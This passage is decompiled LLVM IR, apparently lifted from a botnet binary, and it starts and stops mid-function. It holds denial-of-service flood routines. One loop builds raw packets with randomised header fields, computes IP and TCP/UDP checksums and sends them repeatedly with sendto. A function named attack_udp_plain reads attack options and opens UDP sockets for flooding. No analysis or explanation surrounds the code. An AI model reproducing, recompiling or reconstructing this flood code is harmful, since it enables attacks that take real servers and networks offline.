  %v3_b3bc = inttoptr i32 %v2_b3bc to i32*
  store i32 %v0_b3a4, i32* %v3_b3bc, align 4
  %v0_b3c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b3c0 = add i32 %v1_b3c0, 52
  %v3_b3c0 = inttoptr i32 %v2_b3c0 to i32*
  store i32 %v0_b3c0, i32* %v3_b3c0, align 4
  %v0_b3c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3c4 = trunc i32 %v0_b3c4 to i8
  %v2_b3c4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c4 = add i32 %v2_b3c4, 56
  %v4_b3c4 = inttoptr i32 %v3_b3c4 to i8*
  store i8 %v1_b3c4, i8* %v4_b3c4, align 1
  %v0_b3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 58
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* %r4.global-to-local, align 4
  %v3_b3cc = add i32 %v2_b3cc, 57
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v3_b3d0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b3d0, i32* %r3.global-to-local, align 4
  %v1_b3d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_b3d4 = add i32 %v1_b3d4, %v3_b3d0
  store i32 %v2_b3d4, i32* @r4, align 4
  %v1_b3d8 = load i32, i32* @r7, align 4
  %v9_b3d8 = icmp eq i32 %v2_b3d4, %v1_b3d8
  store i1 %v9_b3d8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_b3d4, i32* %stack_var_-44, align 4
  %v5_b3e0 = icmp slt i32 %v2_b3d4, %v1_b3d8
  br i1 %v5_b3e0, label %dec_label_pc_b228, label %dec_label_pc_b3e4.preheader

dec_label_pc_b3e4.preheader:                      ; preds = %bb61, %dec_label_pc_b158
  %v0_b3e86 = phi i32 [ 0, %dec_label_pc_b158 ], [ %v1_b3d8, %bb61 ]
  %v3_b560 = icmp eq i32 %v6_b10c, -1
  %v8_b560 = icmp eq i32 %v6_b10c, -1
  %v3_b430 = icmp eq i32 %v3_b174, 65535
  br label %dec_label_pc_b3e4

dec_label_pc_b3e4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4, %dec_label_pc_b3e4.preheader
  %v0_b3e8 = phi i32 [ %v0_b3e86, %dec_label_pc_b3e4.preheader ], [ 0, %dec_label_pc_b4f4 ], [ 0, %dec_label_pc_b3e4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b3e8 = icmp eq i32 %v0_b3e8, 0
  store i1 %v2_b3e8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b3e8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b3f4:                                ; preds = %dec_label_pc_b3e4, %dec_label_pc_b4f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b3f8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b470, %dec_label_pc_b3f4
  %v1_b408 = phi i32 [ %v1_b4e4, %dec_label_pc_b470 ], [ 0, %dec_label_pc_b3f4 ]
  %v5_b3fc = mul i32 %v1_b408, 24
  %v1_b400 = load i32, i32* @r8, align 4
  %v2_b400 = add i32 %v1_b400, %v5_b3fc
  store i32 %v2_b400, i32* %r3.global-to-local, align 4
  %v1_b404 = add i32 %v2_b400, 20
  %v2_b404 = inttoptr i32 %v1_b404 to i8*
  %v3_b404 = load i8, i8* %v2_b404, align 1
  %v4_b404 = zext i8 %v3_b404 to i32
  store i32 %v4_b404, i32* %r2.global-to-local, align 4
  %v0_b408 = load i32, i32* @sb, align 4
  %v4_b408 = mul i32 %v1_b408, 4
  %v5_b408 = add i32 %v0_b408, %v4_b408
  %v6_b408 = inttoptr i32 %v5_b408 to i32*
  %v7_b408 = load i32, i32* %v6_b408, align 4
  store i32 %v7_b408, i32* @r5, align 4
  %v7_b40c = icmp eq i8 %v3_b404, 31
  store i1 %v7_b40c, i1* %cpsr_z.global-to-local, align 1
  %v1_b410 = add i32 %v7_b408, 20
  store i32 %v1_b410, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_b404, 32
  br i1 %tmp67, label %dec_label_pc_b508, label %dec_label_pc_b418

dec_label_pc_b418:                                ; preds = %dec_label_pc_b3f8
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_b430, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b430, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b438:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v1_b43c = phi i32 [ %v1_b578, %dec_label_pc_b568 ], [ 65535, %dec_label_pc_b424 ]
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v9_b43c = icmp eq i32 %v3_b178, %v1_b43c
  store i1 %v9_b43c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b43c, label %dec_label_pc_b598, label %dec_label_pc_b444

dec_label_pc_b444:                                ; preds = %dec_label_pc_b584.dec_label_pc_b444_crit_edge, %dec_label_pc_b438
  %v1_b448 = phi i32 [ %v1_b448.pre, %dec_label_pc_b584.dec_label_pc_b444_crit_edge ], [ %v1_b43c, %dec_label_pc_b438 ]
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v9_b448 = icmp eq i32 %v3_b17c, %v1_b448
  store i1 %v9_b448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b448, label %dec_label_pc_b5ac, label %dec_label_pc_b450

dec_label_pc_b450:                                ; preds = %dec_label_pc_b598.dec_label_pc_b450_crit_edge, %dec_label_pc_b444
  %v1_b454 = phi i32 [ %v1_b454.pre, %dec_label_pc_b598.dec_label_pc_b450_crit_edge ], [ %v1_b448, %dec_label_pc_b444 ]
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v9_b454 = icmp eq i32 %v6_b048, %v1_b454
  store i1 %v9_b454, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b454, label %dec_label_pc_b5c0, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge, %dec_label_pc_b450
  %v1_b460 = phi i32 [ %v1_b460.pre, %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge ], [ %v1_b454, %dec_label_pc_b450 ]
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v9_b460 = icmp eq i32 %v6_b060, %v1_b460
  store i1 %v9_b460, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b460, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b468:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b468 = load i32, i32* @fp, align 4
  %v2_b468 = icmp eq i32 %v0_b468, 0
  store i1 %v2_b468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b468, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b470:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4, %dec_label_pc_b5e4
  %v2_b474 = load i32, i32* @r5, align 4
  %v3_b474 = add i32 %v2_b474, 10
  %v4_b474 = inttoptr i32 %v3_b474 to i16*
  store i16 0, i16* %v4_b474, align 2
  %v0_b478 = load i32, i32* @r5, align 4
  store i32 %v0_b478, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_b480 = call i32 @checksum_generic(i32 %v0_b478, i32 20)
  %v3_b480 = trunc i32 %v2_b480 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b488 = load i32, i32* @r5, align 4
  %v4_b488 = add i32 %v3_b488, 10
  %v5_b488 = inttoptr i32 %v4_b488 to i16*
  store i16 %v3_b480, i16* %v5_b488, align 2
  %v0_b48c = load i32, i32* @r6, align 4
  store i32 %v0_b48c, i32* @r1, align 4
  %v0_b490 = load i32, i32* %r2.global-to-local, align 4
  %v1_b490 = trunc i32 %v0_b490 to i16
  %v3_b490 = add i32 %v0_b48c, 16
  %v4_b490 = inttoptr i32 %v3_b490 to i16*
  store i16 %v1_b490, i16* %v4_b490, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r0.global-to-local, align 4
  %v4_b4a0 = call i32 @checksum_tcpudp(i32 %v0_b49c, i32 %v0_b48c, i32 10240, i32 40)
  %v5_b4a0 = trunc i32 %v4_b4a0 to i16
  store i32 %v4_b4a0, i32* %r0.global-to-local, align 4
  %v3_b4a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4a4, i32* %r3.global-to-local, align 4
  %v3_b4a8 = mul i32 %v3_b4a4, 32
  store i32 %v3_b4a8, i32* %lr.global-to-local, align 4
  %v3_b4ac = load i32, i32* @r6, align 4
  %v4_b4ac = add i32 %v3_b4ac, 16
  %v5_b4ac = inttoptr i32 %v4_b4ac to i16*
  store i16 %v5_b4a0, i16* %v5_b4ac, align 2
  %v0_b4b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b4b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_b4b0, -8
  %v5_b4b0 = add i32 %v0_b4b0, %tmp68
  store i32 %v5_b4b0, i32* %lr.global-to-local, align 4
  %v0_b4b4 = load i32, i32* @r6, align 4
  %v1_b4b4 = add i32 %v0_b4b4, 2
  %v2_b4b4 = inttoptr i32 %v1_b4b4 to i16*
  %v3_b4b4 = load i16, i16* %v2_b4b4, align 2
  %v4_b4b4 = zext i16 %v3_b4b4 to i32
  store i32 %v4_b4b4, i32* @r6, align 4
  %v1_b4b8 = load i32, i32* @r8, align 4
  %v2_b4b8 = add i32 %v1_b4b8, %v5_b4b0
  store i32 %v2_b4b8, i32* @lr, align 4
  %v3_b4bc = add i32 %v2_b4b8, 2
  %v4_b4bc = inttoptr i32 %v3_b4bc to i16*
  store i16 %v3_b4b4, i16* %v4_b4bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r5, align 4
  store i32 %v0_b4c8, i32* %r1.global-to-local, align 4
  %v0_b4cc = load i32, i32* @sl, align 4
  store i32 %v0_b4cc, i32* %r0.global-to-local, align 4
  store i32 60, i32* %r2.global-to-local, align 4
  %v0_b4d4 = load i32, i32* @lr, align 4
  %v6_b4dc = call i32 @__libc_sendto(i32 %v0_b4cc, i32 %v0_b4c8, i32 60, i32 16384, i32 %v0_b4d4, i32 16)
  %v3_b4e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b4e0, i32* %r3.global-to-local, align 4
  %v1_b4e4 = add i32 %v3_b4e0, 1
  store i32 %v1_b4e4, i32* %r0.global-to-local, align 4
  %v1_b4e8 = load i32, i32* @r7, align 4
  %v9_b4e8 = icmp eq i32 %v1_b4e4, %v1_b4e8
  store i1 %v9_b4e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b4e4, i32* %stack_var_-44, align 4
  %v5_b4f0 = icmp slt i32 %v1_b4e4, %v1_b4e8
  br i1 %v5_b4f0, label %dec_label_pc_b3f8, label %dec_label_pc_b4f4

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b470
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b4f8 = icmp eq i32 %v1_b4e8, 0
  store i1 %v2_b4f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b4f8, label %dec_label_pc_b3e4, label %dec_label_pc_b3f4

dec_label_pc_b508:                                ; preds = %dec_label_pc_b3f8
  %v1_b508 = add i32 %v2_b400, 16
  %v2_b508 = inttoptr i32 %v1_b508 to i32*
  %v3_b508 = load i32, i32* %v2_b508, align 4
  store i32 %v3_b508, i32* %r4.global-to-local, align 4
  %v0_b50c = call i32 @rand_next()
  store i32 %v0_b50c, i32* %r0.global-to-local, align 4
  %v3_b510 = load i32, i32* %stack_var_-44, align 4
  %v5_b518 = mul i32 %v3_b510, 24
  %v0_b51c = load i32, i32* %r4.global-to-local, align 4
  %v1_b51c = and i32 %v0_b51c, 16711680
  %v3_b520 = udiv i32 %v0_b51c, 16777216
  %v4_b524 = udiv i32 %v1_b51c, 256
  %v5_b524 = or i32 %v4_b524, %v3_b520
  store i32 %v5_b524, i32* %r2.global-to-local, align 4
  %v1_b528 = load i32, i32* @r8, align 4
  %v2_b528 = add i32 %v1_b528, %v5_b518
  store i32 %v2_b528, i32* %r1.global-to-local, align 4
  %v1_b52c = and i32 %v0_b51c, 65280
  store i32 %v1_b52c, i32* %r3.global-to-local, align 4
  %v1_b530 = add i32 %v2_b528, 20
  %v2_b530 = inttoptr i32 %v1_b530 to i8*
  %v3_b530 = load i8, i8* %v2_b530, align 1
  %v4_b530 = zext i8 %v3_b530 to i32
  %v5_b538 = call i32 @llvm.bswap.i32(i32 %v0_b51c)
  %v7_b53c = lshr i32 %v0_b50c, %v4_b530
  %v8_b53c = add i32 %v7_b53c, %v5_b538
  store i32 %v8_b53c, i32* %r2.global-to-local, align 4
  %v1_b540 = and i32 %v8_b53c, 16711680
  store i32 %v1_b540, i32* %r0.global-to-local, align 4
  %v1_b54c = and i32 %v8_b53c, 65280
  store i32 %v1_b54c, i32* %r1.global-to-local, align 4
  %v5_b554 = call i32 @llvm.bswap.i32(i32 %v8_b53c)
  %v1_b558 = load i32, i32* @r5, align 4
  %v2_b558 = add i32 %v1_b558, 16
  %v3_b558 = inttoptr i32 %v2_b558 to i32*
  store i32 %v5_b554, i32* %v3_b558, align 4
  store i32 %v6_b10c, i32* %r3.global-to-local, align 4
  store i1 %v8_b560, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b560, label %dec_label_pc_b568, label %dec_label_pc_b424

dec_label_pc_b568:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b418
  %v0_b568 = call i32 @rand_next()
  store i32 65536, i32* %r4.global-to-local, align 4
  %v1_b570 = load i32, i32* @r5, align 4
  %v2_b570 = add i32 %v1_b570, 12
  %v3_b570 = inttoptr i32 %v2_b570 to i32*
  store i32 %v0_b568, i32* %v3_b570, align 4
  store i32 %v3_b174, i32* %r0.global-to-local, align 4
  %v0_b578 = load i32, i32* %r4.global-to-local, align 4
  %v1_b578 = add i32 %v0_b578, -1
  store i32 %v1_b578, i32* @r4, align 4
  %v9_b57c = icmp eq i32 %v3_b174, %v1_b578
  store i1 %v9_b57c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b57c, label %dec_label_pc_b584, label %dec_label_pc_b438

dec_label_pc_b584:                                ; preds = %dec_label_pc_b568, %dec_label_pc_b424
  %v0_b584 = call i32 @rand_next()
  %v1_b584 = trunc i32 %v0_b584 to i16
  store i32 %v0_b584, i32* %r0.global-to-local, align 4
  store i32 %v3_b178, i32* %r1.global-to-local, align 4
  %v1_b58c = load i32, i32* @r4, align 4
  %v9_b58c = icmp eq i32 %v3_b178, %v1_b58c
  store i1 %v9_b58c, i1* %cpsr_z.global-to-local, align 1
  %v3_b590 = load i32, i32* @r5, align 4
  %v4_b590 = add i32 %v3_b590, 4
  %v5_b590 = inttoptr i32 %v4_b590 to i16*
  store i16 %v1_b584, i16* %v5_b590, align 2
  br i1 %v9_b58c, label %dec_label_pc_b598, label %dec_label_pc_b584.dec_label_pc_b444_crit_edge

dec_label_pc_b584.dec_label_pc_b444_crit_edge:    ; preds = %dec_label_pc_b584
  %v1_b448.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b444

dec_label_pc_b598:                                ; preds = %dec_label_pc_b584, %dec_label_pc_b438
  %v0_b598 = call i32 @rand_next()
  %v1_b598 = trunc i32 %v0_b598 to i16
  store i32 %v0_b598, i32* %r0.global-to-local, align 4
  store i32 %v3_b17c, i32* %r2.global-to-local, align 4
  %v1_b5a0 = load i32, i32* @r4, align 4
  %v9_b5a0 = icmp eq i32 %v3_b17c, %v1_b5a0
  store i1 %v9_b5a0, i1* %cpsr_z.global-to-local, align 1
  %v3_b5a4 = load i32, i32* @r5, align 4
  %v4_b5a4 = add i32 %v3_b5a4, 20
  %v5_b5a4 = inttoptr i32 %v4_b5a4 to i16*
  store i16 %v1_b598, i16* %v5_b5a4, align 2
  br i1 %v9_b5a0, label %dec_label_pc_b5ac, label %dec_label_pc_b598.dec_label_pc_b450_crit_edge

dec_label_pc_b598.dec_label_pc_b450_crit_edge:    ; preds = %dec_label_pc_b598
  %v1_b454.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b450

dec_label_pc_b5ac:                                ; preds = %dec_label_pc_b598, %dec_label_pc_b444
  %v0_b5ac = call i32 @rand_next()
  %v1_b5ac = trunc i32 %v0_b5ac to i16
  store i32 %v0_b5ac, i32* %r0.global-to-local, align 4
  store i32 %v6_b048, i32* %r3.global-to-local, align 4
  %v1_b5b4 = load i32, i32* @r4, align 4
  %v9_b5b4 = icmp eq i32 %v6_b048, %v1_b5b4
  store i1 %v9_b5b4, i1* %cpsr_z.global-to-local, align 1
  %v3_b5b8 = load i32, i32* @r6, align 4
  %v4_b5b8 = add i32 %v3_b5b8, 2
  %v5_b5b8 = inttoptr i32 %v4_b5b8 to i16*
  store i16 %v1_b5ac, i16* %v5_b5b8, align 2
  br i1 %v9_b5b4, label %dec_label_pc_b5c0, label %dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge

dec_label_pc_b5ac.dec_label_pc_b45c_crit_edge:    ; preds = %dec_label_pc_b5ac
  %v1_b460.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b45c

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b5ac, %dec_label_pc_b450
  %v0_b5c0 = call i32 @rand_next()
  %v1_b5c4 = load i32, i32* @r6, align 4
  %v2_b5c4 = add i32 %v1_b5c4, 4
  %v3_b5c4 = inttoptr i32 %v2_b5c4 to i32*
  store i32 %v0_b5c0, i32* %v3_b5c4, align 4
  store i32 %v6_b060, i32* %r0.global-to-local, align 4
  %v1_b5cc = load i32, i32* @r4, align 4
  %v9_b5cc = icmp eq i32 %v6_b060, %v1_b5cc
  store i1 %v9_b5cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b5cc, label %dec_label_pc_b5d4, label %dec_label_pc_b468

dec_label_pc_b5d4:                                ; preds = %dec_label_pc_b5c0, %dec_label_pc_b45c
  %v0_b5d4 = call i32 @rand_next()
  store i32 %v0_b5d4, i32* %r0.global-to-local, align 4
  %v0_b5d8 = load i32, i32* @fp, align 4
  %v2_b5d8 = icmp eq i32 %v0_b5d8, 0
  store i1 %v2_b5d8, i1* %cpsr_z.global-to-local, align 1
  %v1_b5dc = load i32, i32* @r6, align 4
  %v2_b5dc = add i32 %v1_b5dc, 8
  %v3_b5dc = inttoptr i32 %v2_b5dc to i32*
  store i32 %v0_b5d4, i32* %v3_b5dc, align 4
  br i1 %v2_b5d8, label %dec_label_pc_b470, label %dec_label_pc_b5e4

dec_label_pc_b5e4:                                ; preds = %dec_label_pc_b468, %dec_label_pc_b5d4
  %v0_b5e4 = call i32 @rand_next()
  %v1_b5e4 = trunc i32 %v0_b5e4 to i16
  store i32 %v0_b5e4, i32* %r0.global-to-local, align 4
  %v3_b5e8 = load i32, i32* @r6, align 4
  %v4_b5e8 = add i32 %v3_b5e8, 18
  %v5_b5e8 = inttoptr i32 %v4_b5e8 to i16*
  store i16 %v1_b5e4, i16* %v5_b5e8, align 2
  br label %dec_label_pc_b470

dec_label_pc_b5f0:                                ; preds = %dec_label_pc_b130
  %v0_b5f0 = load i32, i32* @sl, align 4
  store i32 %v0_b5f0, i32* %r0.global-to-local, align 4
  %v1_b5f4 = call i32 @__GI___libc_close(i32 %v0_b5f0)
  store i32 %v1_b5f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %entry, %dec_label_pc_b5f0
  %v1_b600 = phi i32 [ %v3_b120, %entry ], [ %v1_b5f4, %dec_label_pc_b5f0 ]
  store i32 %v3_af5c, i32* %r4.global-to-local, align 4
  store i32 %v24_af5c, i32* %fp.global-to-local, align 4
  store i32 %v27_af5c, i32* %lr.global-to-local, align 4
  ret i32 %v1_b600

; uselistorder directives
  uselistorder i32 %v0_b5e4, { 1, 0 }
  uselistorder i32 %v0_b5ac, { 1, 0 }
  uselistorder i32 %v0_b598, { 1, 0 }
  uselistorder i32 %v0_b584, { 1, 0 }
  uselistorder i32 %v1_b578, { 1, 2, 0 }
  uselistorder i32 %v0_b51c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b4e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b4b0, { 1, 0 }
  uselistorder i32 %v4_b4a0, { 1, 0 }
  uselistorder i1 %v3_b430, { 1, 0 }
  uselistorder i32 %v2_b3d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b23c, { 1, 2, 0 }
  uselistorder i32 %v1_b208, { 2, 1, 0 }
  uselistorder i32 %v1_b204, { 2, 0, 1 }
  uselistorder i32 %v1_b200, { 2, 0, 1 }
  uselistorder i32 %v1_b1fc, { 2, 0, 1 }
  uselistorder i32 %v1_b1d8, { 1, 0 }
  uselistorder i32 %v3_b174, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_b168, { 1, 0, 2 }
  uselistorder i32 %v0_b164, { 1, 0, 3, 2 }
  uselistorder i1 %v7_b150, { 1, 0 }
  uselistorder i1 %v7_b124, { 1, 0 }
  uselistorder i32 %v3_b120, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_b10c, { 4, 3, 0, 5, 2, 1 }
  uselistorder i32 %v6_b060, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v6_b048, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_afd4, { 1, 0 }
  uselistorder i32 %v6_afcc, { 1, 0 }
  uselistorder i32 %v7_afb4, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 16, 13, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 34, 33, 35, 36, 37, 39, 38, 41, 40, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 3, 5, 4, 6, 8, 9, 7, 10, 12, 11, 13, 15, 14, 16, 17, 18, 21, 19, 20, 22, 23, 24, 25, 26, 27, 28, 32, 29, 30, 31, 33, 35, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 0 }
  uselistorder i8 4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b5f8, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b470, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3f4, { 1, 0 }
  uselistorder label %dec_label_pc_b3e4, { 1, 0, 2 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
}

define i32 @attack_udp_plain(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v18_b608 = load i32, i32* @sb, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg4, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_b624 = call i32 @calloc(i32 %arg1, i32 4)
  store i32 %v2_b624, i32* @sl, align 4
  %v0_b630 = load i32, i32* @r7, align 4
  %v2_b634 = call i32 @calloc(i32 %v0_b630, i32 4)
  store i32 65535, i32* @r4, align 4
  %v0_b640 = load i32, i32* @r6, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 %v2_b634, i32* @r8, align 4
  %v0_b650 = load i32, i32* @r5, align 4
  %v5_b654 = inttoptr i32 %v0_b640 to i32*
  %v6_b654 = call i32 @attack_get_opt_int(i32 %v0_b650, i32* %v5_b654, i32 7, i32 65535, i32 ptrtoint (i32* @0 to i32))
  %v3_b65c = urem i32 %v6_b654, 65536
  %v0_b660 = load i32, i32* @r6, align 4
  %v0_b668 = load i32, i32* @r4, align 4
  store i32 %v0_b668, i32* %r3.global-to-local, align 4
  %v0_b66c = load i32, i32* @r5, align 4
  %v5_b674 = inttoptr i32 %v0_b660 to i32*
  %v6_b674 = call i32 @attack_get_opt_int(i32 %v0_b66c, i32* %v5_b674, i32 6, i32 %v0_b668, i32 %v3_b65c)
  %v0_b678 = load i32, i32* @r6, align 4
  %v3_b67c = mul i32 %v6_b674, 65536
  store i32 %v3_b67c, i32* %sb.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v0_b688 = load i32, i32* @r5, align 4
  %v5_b68c = inttoptr i32 %v0_b678 to i32*
  %v6_b68c = call i32 @attack_get_opt_int(i32 %v0_b688, i32* %v5_b68c, i32 0, i32 512, i32 ptrtoint (i32* @0 to i32))
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b69c = load i32, i32* @r6, align 4
  %v0_b6a0 = load i32, i32* @r5, align 4
  %v3_b6a4 = urem i32 %v6_b68c, 65536
  store i32 %v3_b6a4, i32* @r5, align 4
  %v5_b6a8 = inttoptr i32 %v0_b69c to i32*
  %v6_b6a8 = call i32 @attack_get_opt_int(i32 %v0_b6a0, i32* %v5_b6a8, i32 1, i32 1, i32 ptrtoint (i32* @0 to i32))
  %v0_b6ac = load i32, i32* %sb.global-to-local, align 4
  %v3_b6ac = udiv i32 %v0_b6ac, 65536
  store i32 %v3_b6ac, i32* @r6, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_b6b4 = load i32, i32* @r4, align 4
  %v9_b6b4 = icmp eq i32 %v3_b6ac, %v1_b6b4
  br i1 %v9_b6b4, label %dec_label_pc_b6e4, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v4_b6cc = udiv i32 %v0_b6ac, 16777216
  store i32 %v4_b6cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6f4

dec_label_pc_b6e4:                                ; preds = %entry
  store i32 0, i32* %stack_var_-56, align 4
  %v0_b6e4 = call i32 @rand_next()
  br label %dec_label_pc_b6f4

dec_label_pc_b6f4:                                ; preds = %bb, %dec_label_pc_b6e4
  %v0_b6d810 = urem i32 %v6_b6a8, 256
  %v0_b6f4 = load i32, i32* @r7, align 4
  %v2_b6f4 = icmp eq i32 %v0_b6f4, 0
  br i1 %v2_b6f4, label %dec_label_pc_b834, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b6f4
  store i32 0, i32* @sb, align 4
  store i32 0, i32* @fp, align 4
  %v3_b7a8 = udiv i32 %v3_b65c, 256
  %v1_b7a4 = mul i32 %v6_b654, 256
  %v4_b7ac = and i32 %v1_b7a4, 65280
  %v5_b7ac = or i32 %v4_b7ac, %v3_b7a8
  %v2_b72c = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_b78c

dec_label_pc_b70c:                                ; preds = %bb51, %dec_label_pc_b7cc
  %v3_b718 = call i32 @socket(i32 2, i32 2, i32 17)
  %v7_b720 = icmp eq i32 %v3_b718, -1
  %v0_b724 = load i32, i32* @sb, align 4
  %v1_b724 = add i32 %v0_b724, 1
  store i32 %v1_b724, i32* @sb, align 4
  %v0_b728 = load i32, i32* @fp, align 4
  %v1_b728 = add i32 %v0_b728, 24
  store i32 %v1_b728, i32* @fp, align 4
  %v2_b734 = load i32, i32* @r8, align 4
  %v3_b734 = add i32 %v2_b734, %stack_var_-60.0
  %v4_b734 = inttoptr i32 %v3_b734 to i32*
  store i32 %v3_b718, i32* %v4_b734, align 4
  br i1 %v7_b720, label %dec_label_pc_b828, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b70c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %stack_var_-56, align 4
